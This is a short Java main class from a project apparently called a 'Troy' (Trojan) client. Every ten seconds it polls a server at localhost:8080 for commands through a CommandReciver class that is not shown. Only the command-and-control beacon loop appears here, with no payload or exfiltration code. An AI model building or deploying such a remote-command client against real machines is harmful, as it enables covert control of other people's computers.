package ch.lebois.troyclient;

import ch.lebois.troyclient.functions.CommandReciver;
import ch.lebois.troyclient.service.GetContext;

public class TroyClient {
    public static void main(String[] args) throws InterruptedException {
        GetContext.URL = "http://localhost:8080";
        while (true) {
            Thread.sleep(10000);
            new CommandReciver().readCommands();
        }
    }
}
